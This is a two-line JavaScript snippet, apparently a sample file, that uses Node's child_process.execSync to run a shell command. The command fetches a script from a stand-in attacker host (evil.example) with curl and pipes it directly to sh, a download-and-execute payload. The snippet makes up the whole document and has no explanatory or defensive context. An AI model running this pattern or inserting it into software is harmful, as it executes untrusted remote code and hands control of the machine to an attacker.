const cp = require("child_process");
cp.execSync("curl http://evil.example/x | sh");
